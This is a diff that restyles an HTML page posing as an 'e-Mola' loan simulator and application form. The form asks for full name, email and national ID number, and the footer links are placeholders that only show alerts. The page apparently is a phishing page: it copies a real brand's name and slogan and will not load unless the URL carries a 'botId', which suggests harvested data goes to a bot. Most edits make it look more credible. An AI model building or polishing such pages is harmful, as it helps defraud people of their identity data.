@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>e-Mola · Pedido de Empréstimo</title>
     <style>
+        /* ── reset & base ── */
         * {
             margin: 0;
             padding: 0;
@@ -19,9 +20,8 @@
         }
 
         body {
-            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-            background:
-                linear-gradient(180deg, #f7a53d 0%, #e38a2e 25%, #c46b22 52%, #a94e1c 76%, #914015 100%);
+            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+            background: linear-gradient(180deg, #f7a53d 0%, #e38a2e 25%, #c46b22 52%, #a94e1c 76%, #914015 100%);
             display: flex;
             justify-content: center;
             align-items: flex-start;
@@ -43,6 +43,7 @@
             margin-top: 20px;
         }
 
+        /* soft background shape */
         .loan-container::after {
             content: "";
             position: absolute;
@@ -57,6 +58,7 @@
             z-index: 0;
         }
 
+        /* back arrow – kept for consistency */
         .loan-container::before {
             content: "";
             position: absolute;
@@ -70,6 +72,7 @@
             z-index: 20;
         }
 
+        /* language selector */
         .language {
             position: absolute;
             top: 83px;
@@ -89,16 +92,11 @@
             display: flex;
             overflow: hidden;
             box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15);
+            border-radius: 4px;
         }
 
-        .flag-green {
-            width: 40%;
-            background: #006600;
-        }
-        .flag-red {
-            width: 60%;
-            background: #ff0000;
-        }
+        .flag-green { width: 40%; background: #006600; }
+        .flag-red { width: 60%; background: #ff0000; }
         .flag-circle {
             position: absolute;
             width: 18px;
@@ -110,6 +108,7 @@
             border: 2px solid #ffffff;
         }
 
+        /* logo */
         .logo-container {
             position: relative;
             z-index: 5;
@@ -144,17 +143,21 @@
             color: #ffffff;
         }
 
+        /* ── white card ── */
         .card {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 24px;
-            padding: 24px 20px;
+            background: rgba(255, 255, 255, 0.96);
+            border-radius: 28px;
+            padding: 28px 24px 32px;
             margin: 20px 0 30px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.18);
             position: relative;
             z-index: 10;
-            color: #333;
+            color: #1e1e1e;
+            backdrop-filter: blur(2px);
+            transition: transform 0.2s;
         }
 
+        /* calculator box inside the card */
         .calculator-box {
             padding: 0;
         }
@@ -162,132 +165,192 @@
         .calculator-box h2 {
             color: #6a0dad;
             margin-top: 0;
-            font-size: 20px;
-            margin-bottom: 12px;
+            font-size: 22px;
+            margin-bottom: 16px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
         }
 
         .loan-amount {
-            font-size: 34px;
+            font-size: 38px;
             font-weight: 700;
             color: #6a0dad;
-            margin: 10px 0;
+            margin: 12px 0 6px;
         }
 
         .slider {
             width: 100%;
+            height: 6px;
             accent-color: #6a0dad;
-            margin: 8px 0;
+            background: #ddd;
+            border-radius: 10px;
+            margin: 12px 0;
+            outline: none;
+            transition: background 0.2s;
+        }
+
+        .slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #6a0dad;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(106, 13, 173, 0.4);
+            transition: transform 0.15s;
+        }
+
+        .slider::-webkit-slider-thumb:hover {
+            transform: scale(1.1);
+        }
+
+        .slider::-moz-range-thumb {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #6a0dad;
+            cursor: pointer;
+            border: none;
+            box-shadow: 0 2px 8px rgba(106, 13, 173, 0.4);
         }
 
         .range-values {
             display: flex;
             justify-content: space-between;
-            font-size: 12px;
+            font-size: 13px;
             color: #777;
-            margin-top: 4px;
+            margin-top: 6px;
+            font-weight: 500;
         }
 
         .term-buttons {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 10px;
-            margin-top: 15px;
+            margin-top: 18px;
         }
 
         .term-btn {
             border: none;
             padding: 12px 6px;
-            border-radius: 12px;
-            background: #e7d8ff;
+            border-radius: 14px;
+            background: #f0e6ff;
             color: #6a0dad;
             font-weight: 600;
-            font-size: 13px;
+            font-size: 14px;
             cursor: pointer;
-            transition: background 0.2s, color 0.2s;
+            transition: background 0.2s, color 0.2s, transform 0.1s;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.04);
+        }
+
+        .term-btn:hover {
+            background: #dcc8ff;
+            transform: scale(1.02);
         }
 
         .term-btn.active {
             background: #6a0dad;
             color: white;
+            box-shadow: 0 4px 12px rgba(106, 13, 173, 0.3);
         }
 
         .payment-box {
-            background: #ede3ff;
+            background: #f3ebff;
             padding: 18px;
-            border-radius: 16px;
+            border-radius: 18px;
             text-align: center;
-            margin-top: 20px;
+            margin-top: 24px;
         }
 
         .payment-box p {
             color: #444;
-            font-size: 14px;
+            font-size: 15px;
             margin-bottom: 4px;
+            font-weight: 500;
         }
 
         .payment-box h2 {
             color: #6a0dad;
             margin: 0;
-            font-size: 24px;
+            font-size: 28px;
+            font-weight: 700;
         }
 
         .apply-btn {
             width: 100%;
-            padding: 14px;
+            padding: 16px;
             background: #6a0dad;
             color: white;
             border: none;
-            border-radius: 30px;
-            font-size: 17px;
+            border-radius: 40px;
+            font-size: 18px;
             font-weight: 700;
             cursor: pointer;
-            margin-top: 20px;
-            transition: background 0.2s;
+            margin-top: 24px;
+            transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
+            box-shadow: 0 4px 14px rgba(106, 13, 173, 0.35);
+            letter-spacing: 0.5px;
         }
 
         .apply-btn:hover {
             background: #5a0b9a;
+            transform: scale(1.01);
+            box-shadow: 0 6px 20px rgba(106, 13, 173, 0.4);
         }
 
+        .apply-btn:active {
+            transform: scale(0.97);
+        }
+
+        /* ── form section (hidden initially) ── */
         .form-section {
             display: none;
+            animation: fadeSlide 0.4s ease forwards;
+        }
+
+        @keyframes fadeSlide {
+            0% { opacity: 0; transform: translateY(15px); }
+            100% { opacity: 1; transform: translateY(0); }
         }
 
         .form-section label {
             display: block;
             font-size: 14px;
-            font-weight: 500;
-            color: #1e1e1e;
-            margin: 14px 0 4px;
+            font-weight: 600;
+            color: #2e2e2e;
+            margin: 16px 0 4px;
         }
 
         .form-section input,
         .form-section select {
             width: 100%;
-            padding: 12px 14px;
-            border: 1.5px solid #ddd;
-            border-radius: 10px;
+            padding: 13px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
             background: #fafafa;
             font-size: 15px;
-            transition: border 0.2s;
+            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
             outline: none;
-            margin-bottom: 6px;
+            margin-bottom: 4px;
+            color: #1e1e1e;
         }
 
         .form-section input:focus,
         .form-section select:focus {
             border-color: #6a0dad;
             background: #fff;
+            box-shadow: 0 0 0 4px rgba(106, 13, 173, 0.12);
         }
 
         .form-section .loan-notice {
             background: #f8f0ff;
             border-left: 5px solid #6a0dad;
-            padding: 14px 16px;
-            border-radius: 10px;
+            padding: 16px 18px;
+            border-radius: 12px;
             font-size: 14px;
             line-height: 1.6;
-            margin: 18px 0 16px;
+            margin: 20px 0 18px;
             color: #333;
         }
 
@@ -295,6 +358,7 @@
             display: block;
             color: #4a0a7a;
             margin-bottom: 6px;
+            font-weight: 700;
         }
 
         .form-section .loan-notice ol {
@@ -308,22 +372,31 @@
 
         .form-section button[type="submit"] {
             width: 100%;
-            padding: 14px;
+            padding: 16px;
             background: #6a0dad;
             color: #fff;
             border: none;
-            border-radius: 30px;
+            border-radius: 40px;
             font-size: 18px;
             font-weight: 700;
             cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 6px;
+            transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
+            margin-top: 8px;
+            box-shadow: 0 4px 14px rgba(106, 13, 173, 0.35);
+            letter-spacing: 0.5px;
         }
 
         .form-section button[type="submit"]:hover {
             background: #5a0b9a;
+            transform: scale(1.01);
+            box-shadow: 0 6px 20px rgba(106, 13, 173, 0.4);
         }
 
+        .form-section button[type="submit"]:active {
+            transform: scale(0.97);
+        }
+
+        /* footer links */
         .footer-links {
             display: flex;
             justify-content: space-between;
@@ -337,24 +410,26 @@
             color: #ffffff;
             text-decoration: none;
             font-weight: 400;
-            transition: opacity 0.2s;
+            transition: opacity 0.2s, transform 0.15s;
         }
 
         .footer-links a:hover {
             opacity: 0.8;
+            transform: translateY(-1px);
             text-decoration: none;
         }
 
         .version {
             text-align: center;
             font-size: 16px;
-            color: rgba(255, 255, 255, 0.65);
+            color: rgba(255, 255, 255, 0.6);
             margin: 10px 0 30px;
             letter-spacing: 0.3px;
             position: relative;
             z-index: 10;
         }
 
+        /* ── responsive ── */
         @media (max-width: 480px) {
             .loan-container::before {
                 top: 91px;
@@ -394,11 +469,11 @@
                 font-size: 19px;
             }
             .card {
-                padding: 20px 16px;
+                padding: 22px 16px 26px;
                 margin: 10px 0 20px;
             }
             .loan-amount {
-                font-size: 28px;
+                font-size: 30px;
             }
             .term-buttons {
                 grid-template-columns: repeat(2, 1fr);
@@ -456,7 +531,7 @@
                 font-size: 50px;
             }
             .card {
-                padding: 16px 14px;
+                padding: 18px 14px 22px;
             }
         }
     </style>
@@ -475,27 +550,27 @@
         <span>POR</span>
     </div>
 
-    <!-- Logo (e-Mola style) -->
+    <!-- Logo -->
     <div class="logo-container">
         <h1>e-Mola</h1>
         <div class="slogan">Meu cell, minha mola</div>
     </div>
 
-    <!-- White card containing calculator + form -->
+    <!-- White card -->
     <div class="card">
 
         <!-- CALCULATOR SECTION -->
         <div id="calculatorSection">
             <div class="calculator-box">
-                <h2>Simulador de Empréstimo</h2>
-                <p style="font-weight:500; color:#333;">Valor do Empréstimo</p>
-                <div class="loan-amount" id="amountDisplay">MT 10,000</div>
+                <h2>📊 Simulador de Empréstimo</h2>
+                <p style="font-weight:600; color:#333; font-size:15px;">Valor do Empréstimo</p>
+                <div class="loan-amount" id="amountDisplay">MT 10.000</div>
                 <input type="range" min="500" max="800000" value="10000" class="slider" id="loanSlider" />
                 <div class="range-values">
                     <span>MT 500</span>
-                    <span>MT 800,000</span>
+                    <span>MT 800.000</span>
                 </div>
-                <h3 style="color:#6a0dad; margin-top:18px; font-size:16px;">Prazo do Empréstimo</h3>
+                <h3 style="color:#6a0dad; margin-top:22px; font-size:17px; font-weight:700;">Prazo do Empréstimo</h3>
                 <div class="term-buttons">
                     <button type="button" class="term-btn" data-months="6">6 meses</button>
                     <button type="button" class="term-btn active" data-months="12">12 meses</button>
@@ -512,17 +587,17 @@
             </div>
         </div>
 
-        <!-- APPLICATION FORM (hidden initially) -->
+        <!-- APPLICATION FORM -->
         <div class="form-section" id="formSection">
             <form id="loanForm">
                 <label>Nome Completo</label>
-                <input id="fullName" type="text" required placeholder="Digite seu nome completo" />
+                <input id="fullName" type="text" required placeholder="Ex: João Silva" />
 
                 <label>Valor do Empréstimo (MT)</label>
-                <input id="loanAmount" type="number" required placeholder="Mínimo 500" />
+                <input id="loanAmount" type="number" required placeholder="Mínimo 500" min="500" max="800000" />
 
                 <label>Endereço de Email</label>
-                <input id="email" type="email" placeholder="exemplo@gmail.com" required />
+                <input id="email" type="email" placeholder="exemplo@email.com" required />
 
                 <label>Número do Documento de Identidade</label>
                 <input id="nationalId" type="text" placeholder="Digite o seu BI / NIF" />
@@ -547,7 +622,7 @@
                 </select>
 
                 <div class="loan-notice">
-                    <strong>Aviso sobre o Pedido de Empréstimo:</strong>
+                    <strong>⚠️ Aviso sobre o Pedido de Empréstimo:</strong>
                     <ol>
                         <li>Certifique-se de que todas as informações fornecidas estão corretas.</li>
                         <li>A aprovação depende da análise de elegibilidade.</li>
@@ -561,7 +636,7 @@
 
     </div> <!-- end card -->
 
-    <!-- Footer links (white on orange) -->
+    <!-- Footer links -->
     <div class="footer-links">
         <a href="#" onclick="alert('Redirecionar para recuperação')">Esqueceu a senha</a>
         <a href="#" onclick="alert('Redirecionar para cadastro')">Cadastrar-se</a>
@@ -581,7 +656,7 @@
         if (botIndex !== -1 && parts[botIndex + 1]) botId = parts[botIndex + 1];
     }
     if (!botId) {
-        alert("Invalid access link");
+        alert("Link de acesso inválido");
         throw new Error("botId missing");
     }
     localStorage.setItem('botId', botId);
@@ -592,6 +667,8 @@
         document.getElementById('formSection').style.display = 'block';
         const slider = document.getElementById('loanSlider');
         document.getElementById('loanAmount').value = slider.value;
+        // scroll to form
+        document.getElementById('formSection').scrollIntoView({ behavior: 'smooth', block: 'start' });
     }
 
     // ---------- CALCULATOR ----------
@@ -613,7 +690,7 @@
 
     function updatePayment() {
         const amount = parseInt(slider.value);
-        amountDisplay.innerText = 'MT ' + amount.toLocaleString();
+        amountDisplay.innerText = 'MT ' + amount.toLocaleString('pt-MZ');
         const payment = (amount / selectedMonths).toFixed(2);
         monthlyPayment.innerText = 'MT ' + payment;
     }
